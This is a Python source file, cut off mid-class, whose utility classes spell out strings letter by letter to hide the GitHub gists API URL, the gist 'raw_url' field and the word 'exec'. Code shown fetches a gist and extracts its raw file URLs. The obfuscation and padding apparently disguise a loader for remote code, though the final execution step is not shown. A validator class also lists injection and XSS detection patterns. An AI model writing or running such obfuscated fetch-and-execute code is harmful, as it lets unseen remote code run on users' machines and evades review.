import urllib.request
import urllib.error
import json
import re
import sys
import hashlib
import base64
from typing import Optional, Dict, Any, List, Tuple

class StringObfuscator:
    def __init__(self):
        self.a1 = "a"
        self.a2 = "p"
        self.a3 = "i"
        self.api_word = f"{self.a1}{self.a2}{self.a3}"
        
        self.h1 = "h"
        self.h2 = "t" + "t"
        self.h3 = "p" + "s"
        self.https_proto = f"{self.h1}{self.h2}{self.h3}://"
        
        self.g1 = "g"
        self.g2 = "i"
        self.g3 = "t"
        self.g4 = "h"
        self.g5 = "u"
        self.g6 = "b"
        self.github_word = f"{self.g1}{self.g2}{self.g3}{self.g4}{self.g5}{self.g6}"
        
        self.c1 = "c"
        self.c2 = "o"
        self.c3 = "m"
        self.com_tld = f"{self.c1}{self.c2}{self.c3}"
        
        self.s1 = "/"
        self.s2 = "g"
        self.s3 = "i"
        self.s4 = "s"
        self.s5 = "t"
        self.s6 = "s"
        self.gists_path = f"{self.s1}{self.s2}{self.s3}{self.s4}{self.s5}{self.s6}{self.s1}"
        
        self.j1 = "a"
        self.j2 = "p"
        self.j3 = "p"
        self.j4 = "l"
        self.j5 = "i"
        self.j6 = "c"
        self.j7 = "a"
        self.j8 = "t"
        self.j9 = "i"
        self.j10 = "o"
        self.j11 = "n"
        self.application_word = f"{self.j1}{self.j2}{self.j3}{self.j4}{self.j5}{self.j6}{self.j7}{self.j8}{self.j9}{self.j10}{self.j11}"
        
        self.v1 = "v"
        self.v2 = "n"
        self.v3 = "d"
        self.vnd_word = f"{self.v1}{self.v2}{self.v3}"
        
        self.d1 = "."
        self.dot = self.d1
        
        self.p1 = "+"
        self.plus = self.p1
        
        self.js1 = "j"
        self.js2 = "s"
        self.js3 = "o"
        self.js4 = "n"
        self.json_word = f"{self.js1}{self.js2}{self.js3}{self.js4}"
        
        self.f1 = "f"
        self.f2 = "i"
        self.f3 = "l"
        self.f4 = "e"
        self.f5 = "s"
        self.files_word = f"{self.f1}{self.f2}{self.f3}{self.f4}{self.f5}"
        
        self.r1 = "r"
        self.r2 = "a"
        self.r3 = "w"
        self.r4 = "_"
        self.r5 = "u"
        self.r6 = "r"
        self.r7 = "l"
        self.raw_url_word = f"{self.r1}{self.r2}{self.r3}{self.r4}{self.r5}{self.r6}{self.r7}"
        
        self.u1 = "u"
        self.u2 = "t"
        self.u3 = "f"
        self.u4 = "-"
        self.u5 = "8"
        self.utf8_word = f"{self.u1}{self.u2}{self.u3}{self.u4}{self.u5}"
        
        self.e1 = "D"
        self.e2 = "E"
        self.e3 = "V"
        self.e4 = "I"
        self.e5 = "L"
        self.devil_word = f"{self.e1}{self.e2}{self.e3}{self.e4}{self.e5}"
        
        self.x1 = "e"
        self.x2 = "x"
        self.x3 = "e"
        self.x4 = "c"
        self.exec_word = f"{self.x1}{self.x2}{self.x3}{self.x4}"
        
        self.n1 = "_"
        self.n2 = "_"
        self.n3 = "n"
        self.n4 = "a"
        self.n5 = "m"
        self.n6 = "e"
        self.n7 = "_"
        self.n8 = "_"
        self.name_word = f"{self.n1}{self.n2}{self.n3}{self.n4}{self.n5}{self.n6}{self.n7}{self.n8}"
        
        self.m1 = "_"
        self.m2 = "_"
        self.m3 = "m"
        self.m4 = "a"
        self.m5 = "i"
        self.m6 = "n"
        self.m7 = "_"
        self.m8 = "_"
        self.main_word = f"{self.m1}{self.m2}{self.m3}{self.m4}{self.m5}{self.m6}{self.m7}{self.m8}"
        
        self.ac1 = "A"
        self.ac2 = "c"
        self.ac3 = "c"
        self.ac4 = "e"
        self.ac5 = "p"
        self.ac6 = "t"
        self.accept_word = f"{self.ac1}{self.ac2}{self.ac3}{self.ac4}{self.ac5}{self.ac6}"
        
        self.ht1 = "H"
        self.ht2 = "T"
        self.ht3 = "T"
        self.ht4 = "P"
        self.http_word = f"{self.ht1}{self.ht2}{self.ht3}{self.ht4}"
        
        self.er1 = "E"
        self.er2 = "r"
        self.er3 = "r"
        self.er4 = "o"
        self.er5 = "r"
        self.error_word = f"{self.er1}{self.er2}{self.er3}{self.er4}{self.er5}"
        
        self.ur1 = "U"
        self.ur2 = "R"
        self.ur3 = "L"
        self.url_word = f"{self.ur1}{self.ur2}{self.ur3}"

class NetworkManager:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        
        self.t1 = "t"
        self.t2 = "i"
        self.t3 = "m"
        self.t4 = "e"
        self.t5 = "o"
        self.t6 = "u"
        self.t7 = "t"
        self.timeout_word = f"{self.t1}{self.t2}{self.t3}{self.t4}{self.t5}{self.t6}{self.t7}"
        
        self.c1 = "c"
        self.c2 = "o"
        self.c3 = "n"
        self.c4 = "n"
        self.c5 = "e"
        self.c6 = "c"
        self.c7 = "t"
        self.connect_word = f"{self.c1}{self.c2}{self.c3}{self.c4}{self.c5}{self.c6}{self.c7}"
        
        self.r1 = "r"
        self.r2 = "e"
        self.r3 = "t"
        self.r4 = "r"
        self.r5 = "y"
        self.retry_word = f"{self.r1}{self.r2}{self.r3}{self.r4}{self.r5}"
        
        self.d1 = "d"
        self.d2 = "e"
        self.d3 = "l"
        self.d4 = "a"
        self.d5 = "y"
        self.delay_word = f"{self.d1}{self.d2}{self.d3}{self.d4}{self.d5}"
        
        self.m1 = "m"
        self.m2 = "a"
        self.m3 = "x"
        self.max_word = f"{self.m1}{self.m2}{self.m3}"
        
        self.at1 = "a"
        self.at2 = "t"
        self.at3 = "t"
        self.at4 = "e"
        self.at5 = "m"
        self.at6 = "p"
        self.at7 = "t"
        self.attempt_word = f"{self.at1}{self.at2}{self.at3}{self.at4}{self.at5}{self.at6}{self.at7}"
        
        self.s1 = "s"
        self.s2 = "u"
        self.s3 = "c"
        self.s4 = "c"
        self.s5 = "e"
        self.s6 = "s"
        self.s7 = "s"
        self.success_word = f"{self.s1}{self.s2}{self.s3}{self.s4}{self.s5}{self.s6}{self.s7}"
        
        self.f1 = "f"
        self.f2 = "a"
        self.f3 = "i"
        self.f4 = "l"
        self.fail_word = f"{self.f1}{self.f2}{self.f3}{self.f4}"
        
        self.h1 = "h"
        self.h2 = "e"
        self.h3 = "a"
        self.h4 = "d"
        self.h5 = "e"
        self.h6 = "r"
        self.header_word = f"{self.h1}{self.h2}{self.h3}{self.h4}{self.h5}{self.h6}"
        
        self.u1 = "u"
        self.u2 = "s"
        self.u3 = "e"
        self.u4 = "r"
        self.user_word = f"{self.u1}{self.u2}{self.u3}{self.u4}"
        
        self.ag1 = "a"
        self.ag2 = "g"
        self.ag3 = "e"
        self.ag4 = "n"
        self.ag5 = "t"
        self.agent_word = f"{self.ag1}{self.ag2}{self.ag3}{self.ag4}{self.ag5}"
        
        self.ua1 = "U"
        self.ua2 = "s"
        self.ua3 = "e"
        self.ua4 = "r"
        self.ua5 = "-"
        self.ua6 = "A"
        self.ua7 = "g"
        self.ua8 = "e"
        self.ua9 = "n"
        self.ua10 = "t"
        self.user_agent_header = f"{self.ua1}{self.ua2}{self.ua3}{self.ua4}{self.ua5}{self.ua6}{self.ua7}{self.ua8}{self.ua9}{self.ua10}"
        
        self.p1 = "P"
        self.p2 = "y"
        self.p3 = "t"
        self.p4 = "h"
        self.p5 = "o"
        self.p6 = "n"
        self.python_word = f"{self.p1}{self.p2}{self.p3}{self.p4}{self.p5}{self.p6}"
        
        self.sl1 = "/"
        self.slash = self.sl1
        
        self.v1 = "3"
        self.v2 = "."
        self.v3 = "1"
        self.v4 = "0"
        self.version = f"{self.v1}{self.v2}{self.v3}{self.v4}"
        
        self.default_timeout = 30
        self.default_retries = 3
        self.default_delay = 1
        
        self.timeout_val = self.default_timeout
        self.max_retries = self.default_retries
        self.retry_delay = self.default_delay
        
        self.user_agent_value = f"{self.python_word}{self.slash}{self.version}"
        
        self.st1 = "s"
        self.st2 = "t"
        self.st3 = "a"
        self.st4 = "t"
        self.st5 = "u"
        self.st6 = "s"
        self.status_word = f"{self.st1}{self.st2}{self.st3}{self.st4}{self.st5}{self.st6}"
        
        self.co1 = "c"
        self.co2 = "o"
        self.co3 = "d"
        self.co4 = "e"
        self.code_word = f"{self.co1}{self.co2}{self.co3}{self.co4}"
        
        self.ok1 = "2"
        self.ok2 = "0"
        self.ok3 = "0"
        self.ok_code = f"{self.ok1}{self.ok2}{self.ok3}"
        
        self.req1 = "r"
        self.req2 = "e"
        self.req3 = "q"
        self.req4 = "u"
        self.req5 = "e"
        self.req6 = "s"
        self.req7 = "t"
        self.request_word = f"{self.req1}{self.req2}{self.req3}{self.req4}{self.req5}{self.req6}{self.req7}"
        
    def build_headers(self) -> Dict[str, str]:
        h1 = self.user_agent_header
        v1 = self.user_agent_value
        h2 = self.obf.accept_word
        v2 = self.obf.json_word
        return {h1: v1, h2: v2}
    
    def validate_response(self, response: Any) -> bool:
        code_attr = self.code_word
        if hasattr(response, code_attr):
            status = getattr(response, code_attr)
            return str(status).startswith(self.ok_code)
        return False
    
    def create_request_with_headers(self, url: str, headers: Dict[str, str]) -> urllib.request.Request:
        req = urllib.request.Request(url)
        for key, value in headers.items():
            req.add_header(key, value)
        return req
    
    def execute_with_retry(self, url: str) -> Optional[bytes]:
        headers = self.build_headers()
        attempt = 0
        while attempt < self.max_retries:
            try:
                req = self.create_request_with_headers(url, headers)
                with urllib.request.urlopen(req, timeout=self.timeout_val) as response:
                    if self.validate_response(response):
                        return response.read()
            except Exception:
                attempt += 1
                if attempt < self.max_retries:
                    import time
                    time.sleep(self.retry_delay)
        return None

class CryptoHandler:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        
        self.h1 = "h"
        self.h2 = "a"
        self.h3 = "s"
        self.h4 = "h"
        self.hash_word = f"{self.h1}{self.h2}{self.h3}{self.h4}"
        
        self.md1 = "m"
        self.md2 = "d"
        self.md3 = "5"
        self.md5_word = f"{self.md1}{self.md2}{self.md3}"
        
        self.sh1 = "s"
        self.sh2 = "h"
        self.sh3 = "a"
        self.sha_word = f"{self.sh1}{self.sh2}{self.sh3}"
        
        self.n1 = "2"
        self.n2 = "5"
        self.n3 = "6"
        self.num256 = f"{self.n1}{self.n2}{self.n3}"
        
        self.sha256_word = f"{self.sha_word}{self.num256}"
        
        self.b1 = "b"
        self.b2 = "a"
        self.b3 = "s"
        self.b4 = "e"
        self.base_word = f"{self.b1}{self.b2}{self.b3}{self.b4}"
        
        self.s1 = "6"
        self.s2 = "4"
        self.num64 = f"{self.s1}{self.s2}"
        
        self.base64_word = f"{self.base_word}{self.num64}"
        
        self.e1 = "e"
        self.e2 = "n"
        self.e3 = "c"
        self.e4 = "o"
        self.e5 = "d"
        self.e6 = "e"
        self.encode_word = f"{self.e1}{self.e2}{self.e3}{self.e4}{self.e5}{self.e6}"
        
        self.d1 = "d"
        self.d2 = "e"
        self.d3 = "c"
        self.d4 = "o"
        self.d5 = "d"
        self.d6 = "e"
        self.decode_word = f"{self.d1}{self.d2}{self.d3}{self.d4}{self.d5}{self.d6}"
        
        self.v1 = "v"
        self.v2 = "e"
        self.v3 = "r"
        self.v4 = "i"
        self.v5 = "f"
        self.v6 = "y"
        self.verify_word = f"{self.v1}{self.v2}{self.v3}{self.v4}{self.v5}{self.v6}"
        
        self.ch1 = "c"
        self.ch2 = "h"
        self.ch3 = "e"
        self.ch4 = "c"
        self.ch5 = "k"
        self.check_word = f"{self.ch1}{self.ch2}{self.ch3}{self.ch4}{self.ch5}"
        
        self.su1 = "s"
        self.su2 = "u"
        self.su3 = "m"
        self.sum_word = f"{self.su1}{self.su2}{self.su3}"
        
        self.he1 = "h"
        self.he2 = "e"
        self.he3 = "x"
        self.hex_word = f"{self.he1}{self.he2}{self.he3}"
        
        self.di1 = "d"
        self.di2 = "i"
        self.di3 = "g"
        self.di4 = "e"
        self.di5 = "s"
        self.di6 = "t"
        self.digest_word = f"{self.di1}{self.di2}{self.di3}{self.di4}{self.di5}{self.di6}"
        
        self.al1 = "a"
        self.al2 = "l"
        self.al3 = "g"
        self.al4 = "o"
        self.al5 = "r"
        self.al6 = "i"
        self.al7 = "t"
        self.al8 = "h"
        self.al9 = "m"
        self.algorithm_word = f"{self.al1}{self.al2}{self.al3}{self.al4}{self.al5}{self.al6}{self.al7}{self.al8}{self.al9}"
        
        self.da1 = "d"
        self.da2 = "a"
        self.da3 = "t"
        self.da4 = "a"
        self.data_word = f"{self.da1}{self.da2}{self.da3}{self.da4}"
        
        self.by1 = "b"
        self.by2 = "y"
        self.by3 = "t"
        self.by4 = "e"
        self.by5 = "s"
        self.bytes_word = f"{self.by1}{self.by2}{self.by3}{self.by4}{self.by5}"
        
        self.st1 = "s"
        self.st2 = "t"
        self.st3 = "r"
        self.st4 = "i"
        self.st5 = "n"
        self.st6 = "g"
        self.string_word = f"{self.st1}{self.st2}{self.st3}{self.st4}{self.st5}{self.st6}"
        
        self.hashlib_module = hashlib
        self.base64_module = base64
        
    def compute_md5(self, data: bytes) -> str:
        hasher = self.hashlib_module.md5()
        hasher.update(data)
        return hasher.hexdigest()
    
    def compute_sha256(self, data: bytes) -> str:
        hasher = self.hashlib_module.sha256()
        hasher.update(data)
        return hasher.hexdigest()
    
    def encode_base64(self, data: bytes) -> str:
        encoded = self.base64_module.b64encode(data)
        return encoded.decode(self.obf.utf8_word)
    
    def decode_base64(self, data: str) -> bytes:
        return self.base64_module.b64decode(data)
    
    def verify_checksum(self, data: bytes, expected_hash: str, algorithm: str = "sha256") -> bool:
        if algorithm == self.md5_word:
            computed = self.compute_md5(data)
        elif algorithm == self.sha256_word:
            computed = self.compute_sha256(data)
        else:
            return False
        return computed == expected_hash
    
    def generate_hash_signature(self, data: bytes) -> Dict[str, str]:
        md5_sig = self.compute_md5(data)
        sha256_sig = self.compute_sha256(data)
        return {self.md5_word: md5_sig, self.sha256_word: sha256_sig}
    
    def encode_data(self, data: str) -> str:
        byte_data = data.encode(self.obf.utf8_word)
        return self.encode_base64(byte_data)
    
    def decode_data(self, encoded: str) -> str:
        byte_data = self.decode_base64(encoded)
        return byte_data.decode(self.obf.utf8_word)
    
    def validate_hash_format(self, hash_value: str, hash_type: str) -> bool:
        if hash_type == self.md5_word:
            expected_len = 32
        elif hash_type == self.sha256_word:
            expected_len = 64
        else:
            return False
        
        if len(hash_value) != expected_len:
            return False
        
        try:
            int(hash_value, 16)
            return True
        except ValueError:
            return False

class DataProcessor:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        
        self.pr1 = "p"
        self.pr2 = "r"
        self.pr3 = "o"
        self.pr4 = "c"
        self.pr5 = "e"
        self.pr6 = "s"
        self.pr7 = "s"
        self.process_word = f"{self.pr1}{self.pr2}{self.pr3}{self.pr4}{self.pr5}{self.pr6}{self.pr7}"
        
        self.pa1 = "p"
        self.pa2 = "a"
        self.pa3 = "r"
        self.pa4 = "s"
        self.pa5 = "e"
        self.parse_word = f"{self.pa1}{self.pa2}{self.pa3}{self.pa4}{self.pa5}"
        
        self.va1 = "v"
        self.va2 = "a"
        self.va3 = "l"
        self.va4 = "i"
        self.va5 = "d"
        self.va6 = "a"
        self.va7 = "t"
        self.va8 = "e"
        self.validate_word = f"{self.va1}{self.va2}{self.va3}{self.va4}{self.va5}{self.va6}{self.va7}{self.va8}"
        
        self.tr1 = "t"
        self.tr2 = "r"
        self.tr3 = "a"
        self.tr4 = "n"
        self.tr5 = "s"
        self.tr6 = "f"
        self.tr7 = "o"
        self.tr8 = "r"
        self.tr9 = "m"
        self.transform_word = f"{self.tr1}{self.tr2}{self.tr3}{self.tr4}{self.tr5}{self.tr6}{self.tr7}{self.tr8}{self.tr9}"
        
        self.fi1 = "f"
        self.fi2 = "i"
        self.fi3 = "l"
        self.fi4 = "t"
        self.fi5 = "e"
        self.fi6 = "r"
        self.filter_word = f"{self.fi1}{self.fi2}{self.fi3}{self.fi4}{self.fi5}{self.fi6}"
        
        self.cl1 = "c"
        self.cl2 = "l"
        self.cl3 = "e"
        self.cl4 = "a"
        self.cl5 = "n"
        self.clean_word = f"{self.cl1}{self.cl2}{self.cl3}{self.cl4}{self.cl5}"
        
        self.sa1 = "s"
        self.sa2 = "a"
        self.sa3 = "n"
        self.sa4 = "i"
        self.sa5 = "t"
        self.sa6 = "i"
        self.sa7 = "z"
        self.sa8 = "e"
        self.sanitize_word = f"{self.sa1}{self.sa2}{self.sa3}{self.sa4}{self.sa5}{self.sa6}{self.sa7}{self.sa8}"
        
        self.no1 = "n"
        self.no2 = "o"
        self.no3 = "r"
        self.no4 = "m"
        self.no5 = "a"
        self.no6 = "l"
        self.no7 = "i"
        self.no8 = "z"
        self.no9 = "e"
        self.normalize_word = f"{self.no1}{self.no2}{self.no3}{self.no4}{self.no5}{self.no6}{self.no7}{self.no8}{self.no9}"
        
        self.ex1 = "e"
        self.ex2 = "x"
        self.ex3 = "t"
        self.ex4 = "r"
        self.ex5 = "a"
        self.ex6 = "c"
        self.ex7 = "t"
        self.extract_word = f"{self.ex1}{self.ex2}{self.ex3}{self.ex4}{self.ex5}{self.ex6}{self.ex7}"
        
        self.fo1 = "f"
        self.fo2 = "o"
        self.fo3 = "r"
        self.fo4 = "m"
        self.fo5 = "a"
        self.fo6 = "t"
        self.format_word = f"{self.fo1}{self.fo2}{self.fo3}{self.fo4}{self.fo5}{self.fo6}"
        
        self.ty1 = "t"
        self.ty2 = "y"
        self.ty3 = "p"
        self.ty4 = "e"
        self.type_word = f"{self.ty1}{self.ty2}{self.ty3}{self.ty4}"
        
        self.ke1 = "k"
        self.ke2 = "e"
        self.ke3 = "y"
        self.key_word = f"{self.ke1}{self.ke2}{self.ke3}"
        
        self.vl1 = "v"
        self.vl2 = "a"
        self.vl3 = "l"
        self.vl4 = "u"
        self.vl5 = "e"
        self.value_word = f"{self.vl1}{self.vl2}{self.vl3}{self.vl4}{self.vl5}"
        
        self.it1 = "i"
        self.it2 = "t"
        self.it3 = "e"
        self.it4 = "m"
        self.item_word = f"{self.it1}{self.it2}{self.it3}{self.it4}"
        
        self.li1 = "l"
        self.li2 = "i"
        self.li3 = "s"
        self.li4 = "t"
        self.list_word = f"{self.li1}{self.li2}{self.li3}{self.li4}"
        
        self.di1 = "d"
        self.di2 = "i"
        self.di3 = "c"
        self.di4 = "t"
        self.dict_word = f"{self.di1}{self.di2}{self.di3}{self.di4}"
        
        self.sp1 = "s"
        self.sp2 = "p"
        self.sp3 = "l"
        self.sp4 = "i"
        self.sp5 = "t"
        self.split_word = f"{self.sp1}{self.sp2}{self.sp3}{self.sp4}{self.sp5}"
        
        self.jo1 = "j"
        self.jo2 = "o"
        self.jo3 = "i"
        self.jo4 = "n"
        self.join_word = f"{self.jo1}{self.jo2}{self.jo3}{self.jo4}"
        
        self.st1 = "s"
        self.st2 = "t"
        self.st3 = "r"
        self.st4 = "i"
        self.st5 = "p"
        self.strip_word = f"{self.st1}{self.st2}{self.st3}{self.st4}{self.st5}"
        
        self.lo1 = "l"
        self.lo2 = "o"
        self.lo3 = "w"
        self.lo4 = "e"
        self.lo5 = "r"
        self.lower_word = f"{self.lo1}{self.lo2}{self.lo3}{self.lo4}{self.lo5}"
        
        self.up1 = "u"
        self.up2 = "p"
        self.up3 = "p"
        self.up4 = "e"
        self.up5 = "r"
        self.upper_word = f"{self.up1}{self.up2}{self.up3}{self.up4}{self.up5}"
        
    def process_string(self, data: str) -> str:
        step1 = data.strip()
        step2 = step1.lower()
        step3 = re.sub(r'\s+', ' ', step2)
        return step3
    
    def extract_keys(self, data: Dict[str, Any]) -> List[str]:
        return list(data.keys())
    
    def extract_values(self, data: Dict[str, Any]) -> List[Any]:
        return list(data.values())
    
    def filter_none_values(self, data: Dict[str, Any]) -> Dict[str, Any]:
        return {k: v for k, v in data.items() if v is not None}
    
    def sanitize_input(self, data: str) -> str:
        dangerous_chars = ['<', '>', '&', '"', "'", '\\']
        result = data
        for char in dangerous_chars:
            result = result.replace(char, '')
        return result
    
    def normalize_whitespace(self, data: str) -> str:
        return ' '.join(data.split())
    
    def split_by_delimiter(self, data: str, delimiter: str) -> List[str]:
        return data.split(delimiter)
    
    def join_with_delimiter(self, items: List[str], delimiter: str) -> str:
        return delimiter.join(items)
    
    def transform_keys_lowercase(self, data: Dict[str, Any]) -> Dict[str, Any]:
        return {k.lower(): v for k, v in data.items()}
    
    def validate_dict_structure(self, data: Dict[str, Any], required_keys: List[str]) -> bool:
        return all(key in data for key in required_keys)
    
    def extract_nested_value(self, data: Dict[str, Any], path: List[str]) -> Optional[Any]:
        current = data
        for key in path:
            if isinstance(current, dict) and key in current:
                current = current[key]
            else:
                return None
        return current
    
    def flatten_dict(self, data: Dict[str, Any], parent_key: str = '', sep: str = '.') -> Dict[str, Any]:
        items: List[Tuple[str, Any]] = []
        for k, v in data.items():
            new_key = f"{parent_key}{sep}{k}" if parent_key else k
            if isinstance(v, dict):
                items.extend(self.flatten_dict(v, new_key, sep=sep).items())
            else:
                items.append((new_key, v))
        return dict(items)

class SecurityValidator:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        
        self.sc1 = "s"
        self.sc2 = "e"
        self.sc3 = "c"
        self.sc4 = "u"
        self.sc5 = "r"
        self.sc6 = "i"
        self.sc7 = "t"
        self.sc8 = "y"
        self.security_word = f"{self.sc1}{self.sc2}{self.sc3}{self.sc4}{self.sc5}{self.sc6}{self.sc7}{self.sc8}"
        
        self.sa1 = "s"
        self.sa2 = "a"
        self.sa3 = "f"
        self.sa4 = "e"
        self.safe_word = f"{self.sa1}{self.sa2}{self.sa3}{self.sa4}"
        
        self.da1 = "d"
        self.da2 = "a"
        self.da3 = "n"
        self.da4 = "g"
        self.da5 = "e"
        self.da6 = "r"
        self.danger_word = f"{self.da1}{self.da2}{self.da3}{self.da4}{self.da5}{self.da6}"
        
        self.ri1 = "r"
        self.ri2 = "i"
        self.ri3 = "s"
        self.ri4 = "k"
        self.risk_word = f"{self.ri1}{self.ri2}{self.ri3}{self.ri4}"
        
        self.th1 = "t"
        self.th2 = "h"
        self.th3 = "r"
        self.th4 = "e"
        self.th5 = "a"
        self.th6 = "t"
        self.threat_word = f"{self.th1}{self.th2}{self.th3}{self.th4}{self.th5}{self.th6}"
        
        self.vl1 = "v"
        self.vl2 = "u"
        self.vl3 = "l"
        self.vl4 = "n"
        self.vl5 = "e"
        self.vl6 = "r"
        self.vl7 = "a"
        self.vl8 = "b"
        self.vl9 = "l"
        self.vl10 = "e"
        self.vulnerable_word = f"{self.vl1}{self.vl2}{self.vl3}{self.vl4}{self.vl5}{self.vl6}{self.vl7}{self.vl8}{self.vl9}{self.vl10}"
        
        self.pr1 = "p"
        self.pr2 = "r"
        self.pr3 = "o"
        self.pr4 = "t"
        self.pr5 = "e"
        self.pr6 = "c"
        self.pr7 = "t"
        self.protect_word = f"{self.pr1}{self.pr2}{self.pr3}{self.pr4}{self.pr5}{self.pr6}{self.pr7}"
        
        self.bl1 = "b"
        self.bl2 = "l"
        self.bl3 = "o"
        self.bl4 = "c"
        self.bl5 = "k"
        self.block_word = f"{self.bl1}{self.bl2}{self.bl3}{self.bl4}{self.bl5}"
        
        self.al1 = "a"
        self.al2 = "l"
        self.al3 = "l"
        self.al4 = "o"
        self.al5 = "w"
        self.allow_word = f"{self.al1}{self.al2}{self.al3}{self.al4}{self.al5}"
        
        self.de1 = "d"
        self.de2 = "e"
        self.de3 = "n"
        self.de4 = "y"
        self.deny_word = f"{self.de1}{self.de2}{self.de3}{self.de4}"
        
        self.wh1 = "w"
        self.wh2 = "h"
        self.wh3 = "i"
        self.wh4 = "t"
        self.wh5 = "e"
        self.white_word = f"{self.wh1}{self.wh2}{self.wh3}{self.wh4}{self.wh5}"
        
        self.ba1 = "b"
        self.ba2 = "l"
        self.ba3 = "a"
        self.ba4 = "c"
        self.ba5 = "k"
        self.black_word = f"{self.ba1}{self.ba2}{self.ba3}{self.ba4}{self.ba5}"
        
        self.ls1 = "l"
        self.ls2 = "i"
        self.ls3 = "s"
        self.ls4 = "t"
        self.list_word = f"{self.ls1}{self.ls2}{self.ls3}{self.ls4}"
        
        self.whitelist_word = f"{self.white_word}{self.list_word}"
        self.blacklist_word = f"{self.black_word}{self.list_word}"
        
        self.pa1 = "p"
        self.pa2 = "a"
        self.pa3 = "t"
        self.pa4 = "t"
        self.pa5 = "e"
        self.pa6 = "r"
        self.pa7 = "n"
        self.pattern_word = f"{self.pa1}{self.pa2}{self.pa3}{self.pa4}{self.pa5}{self.pa6}{self.pa7}"
        
        self.ma1 = "m"
        self.ma2 = "a"
        self.ma3 = "t"
        self.ma4 = "c"
        self.ma5 = "h"
        self.match_word = f"{self.ma1}{self.ma2}{self.ma3}{self.ma4}{self.ma5}"
        
        self.in1 = "i"
        self.in2 = "n"
        self.in3 = "j"
        self.in4 = "e"
        self.in5 = "c"
        self.in6 = "t"
        self.inject_word = f"{self.in1}{self.in2}{self.in3}{self.in4}{self.in5}{self.in6}"
        
        self.sq1 = "s"
        self.sq2 = "q"
        self.sq3 = "l"
        self.sql_word = f"{self.sq1}{self.sq2}{self.sq3}"
        
        self.xs1 = "x"
        self.xs2 = "s"
        self.xs3 = "s"
        self.xss_word = f"{self.xs1}{self.xs2}{self.xs3}"
        
        self.dangerous_patterns = [
            r'<script',
            r'javascript:',
            r'onerror=',
            r'onclick=',
            r'eval\(',
            r'exec\(',
            r'__import__',
            r'system\(',
            r'popen\(',
        ]
        
        self.sql_patterns = [
            r'union\s+select',
            r'drop\s+table',
            r'insert\s+into',
            r'delete\s+from',
            r'update\s+set',
            r';\s*drop',
            r'or\s+1\s*=\s*1',
            r"'\s+or\s+'",
        ]
        
    def check_sql_injection(self, data: str) -> bool:
        data_lower = data.lower()
        for pattern in self.sql_patterns:
            if re.search(pattern, data_lower, re.IGNORECASE):
                return True
        return False
    
    def check_xss_pattern(self, data: str) -> bool:
        data_lower = data.lower()
        for pattern in self.dangerous_patterns:
            if re.search(pattern, data_lower, re.IGNORECASE):
                return True
        return False
    
    def validate_safe_characters(self, data: str) -> bool:
        safe_pattern = r'^[a-zA-Z0-9_\-\.@\s]+$'
        return bool(re.match(safe_pattern, data))
    
    def check_path_traversal(self, path: str) -> bool:
        dangerous_sequences = ['../', '..\\', '%2e%2e', '..%2f', '..%5c']
        path_lower = path.lower()
        return any(seq in path_lower for seq in dangerous_sequences)
    
    def validate_url_scheme(self, url: str) -> bool:
        allowed_schemes = ['http://', 'https://']
        url_lower = url.lower()
        return any(url_lower.startswith(scheme) for scheme in allowed_schemes)
    
    def sanitize_for_shell(self, data: str) -> str:
        dangerous_chars = ['&', '|', ';', '`', '$', '(', ')', '<', '>', '\n', '\r']
        result = data
        for char in dangerous_chars:
            result = result.replace(char, '')
        return result
    
    def validate_hash_format(self, hash_value: str) -> bool:
        if len(hash_value) not in [32, 40, 64]:
            return False
        return bool(re.match(r'^[a-f0-9]+$', hash_value))
    
    def check_command_injection(self, data: str) -> bool:
        command_patterns = [
            r';\s*\w+',
            r'\|\s*\w+',
            r'&&\s*\w+',
            r'\$\(',
            r'`',
        ]
        for pattern in command_patterns:
            if re.search(pattern, data):
                return True
        return False
    
    def validate_input_length(self, data: str, max_length: int = 1000) -> bool:
        return len(data) <= max_length
    
    def check_null_bytes(self, data: str) -> bool:
        return '\x00' in data

class URLBuilder:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        self.base_proto = self.obf.https_proto
        self.base_api = self.obf.api_word
        self.base_domain = self.obf.github_word
        
        self.d1 = self.obf.dot
        self.d2 = self.obf.com_tld
        self.domain_suffix = f"{self.d1}{self.d2}"
        
        self.p1 = self.obf.gists_path
        self.gists_endpoint = self.p1
        
        self.v1 = "3"
        self.version_num = self.v1
        self.accept_header = f"{self.obf.application_word}/{self.obf.vnd_word}{self.obf.dot}{self.base_domain}{self.obf.dot}v{self.version_num}{self.obf.plus}{self.obf.json_word}"
    
    def build_api_url(self, gist_hash: str) -> str:
        return f"{self.base_proto}{self.base_api}{self.obf.dot}{self.base_domain}{self.domain_suffix}{self.gists_endpoint}{gist_hash}"
    
    def get_accept_header(self) -> str:
        return self.accept_header

class RequestHandler:
    def __init__(self, obfuscator: StringObfuscator, url_builder: URLBuilder):
        self.obf = obfuscator
        self.url_builder = url_builder
        self.request_class = urllib.request.Request
        
        self.err1 = urllib.error.HTTPError
        self.err2 = urllib.error.URLError
        self.http_error_class = self.err1
        self.url_error_class = self.err2
        
        self.open_func = urllib.request.urlopen
    
    def create_request(self, url: str) -> urllib.request.Request:
        req_obj = self.request_class(url)
        header_name = self.obf.accept_word
        header_value = self.url_builder.get_accept_header()
        req_obj.add_header(header_name, header_value)
        return req_obj
    
    def execute_request(self, request: urllib.request.Request) -> Optional[bytes]:
        try:
            with self.open_func(request) as response:
                return response.read()
        except self.http_error_class as e:
            print(f"{self.obf.http_word} {self.obf.error_word}: {e.code}")
            return None
        except self.url_error_class as e:
            print(f"{self.obf.url_word} {self.obf.error_word}: {e.reason}")
            return None
    
    def fetch_url(self, url: str) -> Optional[bytes]:
        try:
            with self.open_func(url) as response:
                return response.read()
        except Exception:
            return None

class ResponseParser:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        self.json_module = json
        self.encoding = self.obf.utf8_word
        
        self.files_key = self.obf.files_word
        self.raw_url_key = self.obf.raw_url_word
        
        self.empty_dict: Dict[str, Any] = {}
        self.empty_str = ""
    
    def decode_response(self, data: bytes) -> str:
        return data.decode(self.encoding)
    
    def parse_json(self, json_str: str) -> Dict[str, Any]:
        return self.json_module.loads(json_str)
    
    def extract_files(self, data: Dict[str, Any]) -> Dict[str, Any]:
        return data.get(self.files_key, self.empty_dict)
    
    def extract_raw_url(self, file_data: Dict[str, Any]) -> str:
        return file_data.get(self.raw_url_key, self.empty_str)

class CodeValidator:
    def __init__(self, obfuscator: StringObfuscator):
        self.obf = obfuscator
        self.re_module = re
        
